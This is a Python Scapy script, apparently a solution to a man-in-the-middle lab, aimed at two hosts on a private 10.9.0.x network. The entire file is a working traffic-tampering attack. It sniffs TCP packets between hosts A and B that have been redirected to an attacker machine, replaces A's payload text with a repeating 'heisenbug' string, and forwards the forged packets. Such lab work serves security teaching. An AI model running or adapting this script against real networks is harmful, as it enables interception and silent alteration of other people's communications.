#!/bin/env python3

from scapy.all import *

IP_A  = '10.9.0.5'
MAC_A = '02:42:0a:09:00:05'
IP_B  = '10.9.0.6'
MAC_B = '02:42:0a:09:00:06'
IP_M  = '10.9.0.105'
MAC_M = '02:42:0a:09:00:69'
# only capture packets whose destination MAC address is host M
F = 'tcp and host 10.9.0.5 and host 10.9.0.6 and ether dst 02:42:0a:09:00:69'

FNAME = ['h', 'e', 'i', 's', 'e', 'n', 'b', 'u', 'g']
LEN   = 9

def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)
        if pkt[TCP].payload:
            data = pkt[TCP].payload.load
            list_str = list(data)
            cur = 0
            for i in range(0, len(list_str)):
                list_str[i] = FNAME[cur]
                cur = (cur + 1) % LEN
            list_str[-1] = '\n'
            newdata = ''.join(list_str)
            send(newpkt/newdata)
        else:
            send(newpkt)
    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        send(newpkt)

pkt = sniff(iface='eth0', filter=F, prn=spoof_pkt)
